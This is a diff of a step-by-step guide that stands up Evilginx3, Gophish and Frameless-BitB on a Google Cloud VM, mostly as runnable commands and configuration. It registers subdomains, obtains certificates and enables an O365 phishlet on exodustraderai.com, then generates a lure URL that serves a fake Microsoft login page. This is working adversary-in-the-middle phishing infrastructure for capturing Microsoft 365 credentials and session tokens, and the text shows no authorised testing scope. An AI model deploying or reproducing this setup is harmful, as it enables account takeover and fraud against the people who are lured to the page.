@@ -11,20 +11,21 @@ This guide provides a complete, step-by-step setup with ZERO errors. Every comma
 ## Table of Contents
 
 1. [Prerequisites](#prerequisites)
-2. [GCP VM Setup via gcloud CLI](#gcp-vm-setup)
-3. [DNS Configuration](#dns-configuration)
-4. [Initial Server Setup](#initial-server-setup)
-5. [Install Dependencies](#install-dependencies)
-6. [Install Gophish](#install-gophish)
-7. [Install Evilginx3](#install-evilginx3)
-8. [Install Frameless-BitB](#install-frameless-bitb)
-9. [Apache Configuration](#apache-configuration)
-10. [SSL Certificate Setup](#ssl-certificate-setup)
-11. [Evilginx3 Configuration](#evilginx3-configuration)
-12. [Systemd Services](#systemd-services)
-13. [Final Verification](#final-verification)
-14. [Access Dashboards](#access-dashboards)
-15. [Troubleshooting](#troubleshooting)
+2. [GCP API Setup and Credentials](#gcp-api-setup)
+3. [GCP VM Setup via gcloud CLI](#gcp-vm-setup)
+4. [DNS Configuration](#dns-configuration)
+5. [Initial Server Setup](#initial-server-setup)
+6. [Install Dependencies](#install-dependencies)
+7. [Install Gophish](#install-gophish)
+8. [Install Evilginx3](#install-evilginx3)
+9. [Install Frameless-BitB](#install-frameless-bitb)
+10. [Apache Configuration](#apache-configuration)
+11. [SSL Certificate Setup](#ssl-certificate-setup)
+12. [Evilginx3 Configuration](#evilginx3-configuration)
+13. [Systemd Services](#systemd-services)
+14. [Final Verification](#final-verification)
+15. [Access Dashboards](#access-dashboards)
+16. [Troubleshooting](#troubleshooting)
 
 ---
 
@@ -45,9 +46,105 @@ gcloud config list project
 
 ---
 
-## 2. GCP VM Setup via gcloud CLI
+## 2. GCP API Setup and Credentials
 
-### 2.1 Create Static External IP
+**IMPORTANT**: If you plan to use Cloud DNS API or other GCP services programmatically, you need to enable the APIs and create service account credentials.
+
+### 2.1 Enable Required APIs
+
+```bash
+# Enable Compute Engine API
+gcloud services enable compute.googleapis.com
+
+# Enable Cloud DNS API (if using Cloud DNS instead of Cloudflare)
+gcloud services enable dns.googleapis.com
+
+# Enable Service Management API
+gcloud services enable servicemanagement.googleapis.com
+```
+
+**Expected Output:**
+```
+Operation "operations/..." finished successfully.
+```
+
+### 2.2 Create Service Account for API Access
+
+```bash
+# Create service account
+gcloud iam service-accounts create evilgophish-sa \
+  --display-name="EvilGophish Service Account" \
+  --description="Service account for EvilGophish automated operations"
+```
+
+**Expected Output:**
+```
+Created service account [evilgophish-sa].
+```
+
+### 2.3 Grant Necessary Permissions
+
+```bash
+# Get your project ID
+PROJECT_ID=$(gcloud config get-value project)
+
+# Grant DNS Administrator role (if using Cloud DNS)
+gcloud projects add-iam-policy-binding $PROJECT_ID \
+  --member="serviceAccount:evilgophish-sa@${PROJECT_ID}.iam.gserviceaccount.com" \
+  --role="roles/dns.admin"
+
+# Grant Compute Instance Admin role
+gcloud projects add-iam-policy-binding $PROJECT_ID \
+  --member="serviceAccount:evilgophish-sa@${PROJECT_ID}.iam.gserviceaccount.com" \
+  --role="roles/compute.instanceAdmin.v1"
+```
+
+### 2.4 Create and Download Service Account Key
+
+```bash
+# Create JSON key file
+gcloud iam service-accounts keys create ~/evilgophish-sa-key.json \
+  --iam-account=evilgophish-sa@${PROJECT_ID}.iam.gserviceaccount.com
+```
+
+**Expected Output:**
+```
+created key [...] of type [json] as [/home/user/evilgophish-sa-key.json] for [evilgophish-sa@PROJECT_ID.iam.gserviceaccount.com]
+```
+
+### 2.5 Set Authentication Environment Variable
+
+```bash
+# Add to your shell profile for persistent authentication
+echo "export GOOGLE_APPLICATION_CREDENTIALS=~/evilgophish-sa-key.json" >> ~/.bashrc
+source ~/.bashrc
+
+# Verify authentication
+gcloud auth application-default print-access-token
+```
+
+**Expected Output:** An access token (long string)
+
+### 2.6 Verify API Access
+
+```bash
+# Test Compute Engine API
+gcloud compute zones list --limit=5
+
+# Test Cloud DNS API (if enabled)
+gcloud dns managed-zones list
+```
+
+**SECURITY NOTE**:
+- The JSON key file (`evilgophish-sa-key.json`) contains sensitive credentials
+- Store it securely and never commit it to version control
+- You can delete the local key file after setting up the VM if not needed for automation
+
+---
+
+## 3. GCP VM Setup via gcloud CLI
+
+### 3.1 Create Static External IP
 
 ```bash
 gcloud compute addresses create evilgophish-ip \
@@ -72,7 +169,7 @@ addressType: EXTERNAL
 status: RESERVED
 ```
 
-### 2.2 Create Firewall Rules
+### 3.2 Create Firewall Rules
 
 Create comprehensive firewall rules with proper network tags:
 
@@ -127,7 +224,7 @@ gcloud compute firewall-rules create evilgophish-allow-dns \
 gcloud compute firewall-rules list --filter="name~evilgophish"
 ```
 
-### 2.3 Create VM Instance
+### 3.3 Create VM Instance
 
 ```bash
 gcloud compute instances create evilgophish-server \
@@ -153,7 +250,7 @@ NAME                 ZONE           MACHINE_TYPE   PREEMPTIBLE  INTERNAL_IP  EXT
 evilgophish-server   us-central1-c  e2-standard-2               10.x.x.x     34.173.185.6   RUNNING
 ```
 
-### 2.4 SSH into VM
+### 3.4 SSH into VM
 
 ```bash
 gcloud compute ssh evilgophish-server --zone=us-central1-c
@@ -163,9 +260,9 @@ gcloud compute ssh evilgophish-server --zone=us-central1-c
 
 ---
 
-## 3. DNS Configuration
+## 4. DNS Configuration
 
-### 3.1 Required DNS Records
+### 4.1 Required DNS Records
 
 Login to **Cloudflare** and add these DNS records for **exodustraderai.com**:
 
@@ -180,7 +277,7 @@ Login to **Cloudflare** and add these DNS records for **exodustraderai.com**:
 
 **CRITICAL**: Ensure "Proxy status" is **DNS only** (gray cloud icon), NOT proxied (orange cloud).
 
-### 3.2 Verify DNS Propagation
+### 4.2 Verify DNS Propagation
 
 Wait 2-3 minutes, then verify from your VM:
 
@@ -195,23 +292,23 @@ done
 
 ---
 
-## 4. Initial Server Setup
+## 5. Initial Server Setup
 
-### 4.1 Update System
+### 5.1 Update System
 
 ```bash
 sudo su -
 apt-get update && apt-get upgrade -y
 ```
 
-### 4.2 Set Hostname
+### 5.2 Set Hostname
 
 ```bash
 hostnamectl set-hostname evilgophish-server
 echo "34.173.185.6 evilgophish-server" >> /etc/hosts
 ```
 
-### 4.3 Configure Timezone
+### 5.3 Configure Timezone
 
 ```bash
 timedatectl set-timezone UTC
@@ -220,9 +317,9 @@ timedatectl
 
 ---
 
-## 5. Install Dependencies
+## 6. Install Dependencies
 
-### 5.1 Install Required Packages
+### 6.1 Install Required Packages
 
 ```bash
 apt-get install -y \
@@ -240,7 +337,7 @@ apt-get install -y \
   sqlite3
 ```
 
-### 5.2 Install Go
+### 6.2 Install Go
 
 ```bash
 wget https://go.dev/dl/go1.23.3.linux-amd64.tar.gz
@@ -256,16 +353,16 @@ go version
 
 ---
 
-## 6. Install Gophish
+## 7. Install Gophish
 
-### 6.1 Create Directory Structure
+### 7.1 Create Directory Structure
 
 ```bash
 mkdir -p /opt/security-testing/evilgophish
 cd /opt/security-testing/evilgophish
 ```
 
-### 6.2 Clone and Build Gophish
+### 7.2 Clone and Build Gophish
 
 ```bash
 git clone https://github.com/gophish/gophish.git
@@ -273,7 +370,7 @@ cd gophish
 go build
 ```
 
-### 6.3 Configure Gophish
+### 7.3 Configure Gophish
 
 ```bash
 cat > config.json << 'EOF'
@@ -303,7 +400,7 @@ cat > config.json << 'EOF'
 EOF
 ```
 
-### 6.4 Test Gophish
+### 7.4 Test Gophish
 
 ```bash
 ./gophish &
@@ -316,9 +413,9 @@ pkill gophish
 
 ---
 
-## 7. Install Evilginx3
+## 8. Install Evilginx3
 
-### 7.1 Clone Evilginx3
+### 8.1 Clone Evilginx3
 
 ```bash
 cd /opt/security-testing/evilgophish
@@ -326,19 +423,19 @@ git clone https://github.com/kgretzky/evilginx2.git evilginx3
 cd evilginx3
 ```
 
-### 7.2 Build Evilginx3
+### 8.2 Build Evilginx3
 
 ```bash
 make
 ```
 
-### 7.3 Create Phishlets Directory
+### 8.3 Create Phishlets Directory
 
 ```bash
 mkdir -p /opt/security-testing/evilgophish/evilginx3/phishlets
 ```
 
-### 7.4 Install O365 Phishlet
+### 8.4 Install O365 Phishlet
 
 Download the latest O365 phishlet:
 
@@ -385,16 +482,16 @@ EOF
 
 ---
 
-## 8. Install Frameless-BitB
+## 9. Install Frameless-BitB
 
-### 8.1 Clone Repository
+### 9.1 Clone Repository
 
 ```bash
 cd /opt/security-testing/evilgophish
 git clone https://github.com/mrd0x/Frameless-BitB.git
 ```
 
-### 8.2 Verify Files
+### 9.2 Verify Files
 
 ```bash
 ls -la /opt/security-testing/evilgophish/Frameless-BitB/
@@ -404,16 +501,16 @@ ls -la /opt/security-testing/evilgophish/Frameless-BitB/
 
 ---
 
-## 9. Apache Configuration
+## 10. Apache Configuration
 
-### 9.1 Enable Required Apache Modules
+### 10.1 Enable Required Apache Modules
 
 ```bash
 a2enmod ssl proxy proxy_http proxy_balancer lbmethod_byrequests headers rewrite
 systemctl restart apache2
 ```
 
-### 9.2 Stop Apache Temporarily (for SSL cert generation)
+### 10.2 Stop Apache Temporarily (for SSL cert generation)
 
 ```bash
 systemctl stop apache2
@@ -421,9 +518,9 @@ systemctl stop apache2
 
 ---
 
-## 10. SSL Certificate Setup
+## 11. SSL Certificate Setup
 
-### 10.1 Generate SSL Certificate with Certbot (Standalone Mode)
+### 11.1 Generate SSL Certificate with Certbot (Standalone Mode)
 
 This gets certificates for ALL subdomains at once:
 
@@ -447,14 +544,14 @@ Certificate is saved at: /etc/letsencrypt/live/accounts.exodustraderai.com/fullc
 Key is saved at:         /etc/letsencrypt/live/accounts.exodustraderai.com/privkey.pem
 ```
 
-### 10.2 Verify Certificates
+### 11.2 Verify Certificates
 
 ```bash
 ls -la /etc/letsencrypt/live/accounts.exodustraderai.com/
 certbot certificates
 ```
 
-### 10.3 Set Up Auto-Renewal
+### 11.3 Set Up Auto-Renewal
 
 ```bash
 systemctl enable certbot.timer
@@ -464,15 +561,15 @@ systemctl status certbot.timer
 
 ---
 
-## 11. Evilginx3 Configuration
+## 12. Evilginx3 Configuration
 
-### 11.1 Create Evilginx3 Config Directory
+### 12.1 Create Evilginx3 Config Directory
 
 ```bash
 mkdir -p /root/.evilginx
 ```
 
-### 11.2 Pre-configure Evilginx3
+### 12.2 Pre-configure Evilginx3
 
 Create initial configuration file:
 
@@ -485,7 +582,7 @@ dns_port: 53
 EOF
 ```
 
-### 11.3 Configure Evilginx3 Interactively
+### 12.3 Configure Evilginx3 Interactively
 
 Run Evilginx3 in interactive mode to complete setup:
 
@@ -507,7 +604,7 @@ phishlets hostname O365 accounts.exodustraderai.com
 
 **DO NOT enable the phishlet yet.** Just configure it. Type `exit` to quit.
 
-### 11.4 Configure Evilginx3 to Use Let's Encrypt Certificates
+### 12.4 Configure Evilginx3 to Use Let's Encrypt Certificates
 
 Evilginx3 needs to use the certificates we already generated instead of trying to get its own:
 
@@ -531,9 +628,9 @@ EOF
 
 ---
 
-## 12. Apache Configuration (Continued)
+## 13. Apache Configuration (Continued)
 
-### 12.1 Create Apache VirtualHost
+### 13.1 Create Apache VirtualHost
 
 ```bash
 cat > /etc/apache2/sites-available/accounts.exodustraderai.com.conf << 'EOF'
@@ -586,7 +683,7 @@ cat > /etc/apache2/sites-available/accounts.exodustraderai.com.conf << 'EOF'
 EOF
 ```
 
-### 12.2 Enable Site and Restart Apache
+### 13.2 Enable Site and Restart Apache
 
 ```bash
 a2dissite 000-default.conf
@@ -601,9 +698,9 @@ systemctl status apache2
 
 ---
 
-## 13. Systemd Services
+## 14. Systemd Services
 
-### 13.1 Create Gophish Service
+### 14.1 Create Gophish Service
 
 ```bash
 cat > /etc/systemd/system/gophish.service << 'EOF'
@@ -628,7 +725,7 @@ WantedBy=multi-user.target
 EOF
 ```
 
-### 13.2 Create Evilginx3 Service
+### 14.2 Create Evilginx3 Service
 
 ```bash
 cat > /etc/systemd/system/evilginx3.service << 'EOF'
@@ -661,7 +758,7 @@ WantedBy=multi-user.target
 EOF
 ```
 
-### 13.3 Reload Systemd and Enable Services
+### 14.3 Reload Systemd and Enable Services
 
 ```bash
 systemctl daemon-reload
@@ -669,7 +766,7 @@ systemctl enable gophish
 systemctl enable evilginx3
 ```
 
-### 13.4 Start Services in Order
+### 14.4 Start Services in Order
 
 ```bash
 # Start Gophish first
@@ -685,7 +782,7 @@ systemctl status evilginx3 --no-pager
 
 **Expected Output:** Both services should show `active (running)`
 
-### 13.5 Verify Ports
+### 14.5 Verify Ports
 
 ```bash
 netstat -tulpn | grep -E ':53|:443|:3333|:8080|:8443'
@@ -703,9 +800,9 @@ udp    0.0.0.0:53         evilginx3
 
 ---
 
-## 14. Final Verification
+## 15. Final Verification
 
-### 14.1 Test External HTTPS Access
+### 15.1 Test External HTTPS Access
 
 ```bash
 curl -I https://accounts.exodustraderai.com
@@ -717,7 +814,7 @@ HTTP/1.1 200 OK
 Server: Apache/2.4.52 (Ubuntu)
 ```
 
-### 14.2 Test Each Subdomain
+### 15.2 Test Each Subdomain
 
 ```bash
 for subdomain in login.accounts account.accounts www.accounts sso.accounts portal.accounts; do
@@ -727,7 +824,7 @@ for subdomain in login.accounts account.accounts www.accounts sso.accounts porta
 done
 ```
 
-### 14.3 Check Service Logs
+### 15.3 Check Service Logs
 
 ```bash
 # Gophish logs
@@ -743,9 +840,9 @@ tail -n 20 /var/log/apache2/accounts.exodustraderai.com-error.log
 
 ---
 
-## 15. Access Dashboards
+## 16. Access Dashboards
 
-### 15.1 Get Gophish Initial Password
+### 16.1 Get Gophish Initial Password
 
 ```bash
 journalctl -u gophish --no-pager | grep "Please login with"
@@ -756,7 +853,7 @@ journalctl -u gophish --no-pager | grep "Please login with"
 Please login with the username admin and the password <random_password>
 ```
 
-### 15.2 Create SSH Tunnel (Run from your LOCAL machine)
+### 16.2 Create SSH Tunnel (Run from your LOCAL machine)
 
 ```bash
 gcloud compute ssh evilgophish-server \
@@ -764,14 +861,14 @@ gcloud compute ssh evilgophish-server \
   -- -L 3333:127.0.0.1:3333
 ```
 
-### 15.3 Access Gophish Dashboard
+### 16.3 Access Gophish Dashboard
 
 Open in your browser: **https://127.0.0.1:3333**
 
 - Username: `admin`
 - Password: (from step 15.1)
 
-### 15.4 Access Evilginx3 Console
+### 16.4 Access Evilginx3 Console
 
 SSH into the server and run:
 
@@ -782,9 +879,9 @@ cd /opt/security-testing/evilgophish/evilginx3
 
 ---
 
-## 16. Enable O365 Phishlet
+## 17. Enable O365 Phishlet
 
-### 16.1 In Evilginx3 Console
+### 17.1 In Evilginx3 Console
 
 ```
 phishlets enable O365
@@ -794,15 +891,15 @@ lures get-url 0
 
 This will generate your phishing URL.
 
-### 16.2 Test Phishing URL
+### 17.2 Test Phishing URL
 
 Open the generated URL in a browser. You should see a Microsoft login page.
 
 ---
 
-## 17. Troubleshooting
+## 18. Troubleshooting
 
-### 17.1 Service Won't Start
+### 18.1 Service Won't Start
 
 ```bash
 # Check service status
@@ -815,7 +912,7 @@ journalctl -u gophish -n 50 --no-pager
 journalctl -u evilginx3 -n 50 --no-pager
 ```
 
-### 17.2 Port Already in Use
+### 18.2 Port Already in Use
 
 ```bash
 # Find what's using the port
@@ -827,7 +924,7 @@ lsof -i :53
 kill -9 <PID>
 ```
 
-### 17.3 SSL Certificate Issues
+### 18.3 SSL Certificate Issues
 
 ```bash
 # Check certificate validity
@@ -839,7 +936,7 @@ systemctl restart apache2
 systemctl restart evilginx3
 ```
 
-### 17.4 DNS Issues
+### 18.4 DNS Issues
 
 ```bash
 # Check DNS resolution
@@ -853,7 +950,7 @@ for sub in login account www sso portal; do
 done
 ```
 
-### 17.5 503 Service Unavailable
+### 18.5 503 Service Unavailable
 
 This means Apache can't proxy to Evilginx3:
 
@@ -869,7 +966,7 @@ systemctl restart evilginx3
 systemctl restart apache2
 ```
 
-### 17.6 Let's Encrypt Rate Limits
+### 18.6 Let's Encrypt Rate Limits
 
 If you hit rate limits:
 
@@ -888,9 +985,9 @@ certbot certonly --standalone --staging \
 
 ---
 
-## 18. Security Hardening
+## 19. Security Hardening
 
-### 18.1 Configure UFW Firewall
+### 19.1 Configure UFW Firewall
 
 ```bash
 ufw allow 22/tcp
@@ -901,7 +998,7 @@ ufw enable
 ufw status
 ```
 
-### 18.2 Configure Fail2Ban
+### 19.2 Configure Fail2Ban
 
 ```bash
 cat > /etc/fail2ban/jail.local << 'EOF'
@@ -918,7 +1015,7 @@ systemctl restart fail2ban
 systemctl status fail2ban
 ```
 
-### 18.3 Disable Root SSH Login (Optional)
+### 19.3 Disable Root SSH Login (Optional)
 
 ```bash
 sed -i 's/#PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
@@ -927,9 +1024,9 @@ systemctl restart sshd
 
 ---
 
-## 19. Backup Configuration
+## 20. Backup Configuration
 
-### 19.1 Create Backup Script
+### 20.1 Create Backup Script
 
 ```bash
 cat > /root/backup-evilgophish.sh << 'EOF'
@@ -956,7 +1053,7 @@ EOF
 chmod +x /root/backup-evilgophish.sh
 ```
 
-### 19.2 Schedule Daily Backups
+### 20.2 Schedule Daily Backups
 
 ```bash
 (crontab -l 2>/dev/null; echo "0 2 * * * /root/backup-evilgophish.sh >> /var/log/evilgophish-backup.log 2>&1") | crontab -
@@ -964,7 +1061,7 @@ chmod +x /root/backup-evilgophish.sh
 
 ---
 
-## 20. Complete Installation Checklist
+## 21. Complete Installation Checklist
 
 - [ ] GCP VM created with static IP 34.173.185.6
 - [ ] Firewall rules configured for ports 22, 80, 443, 53
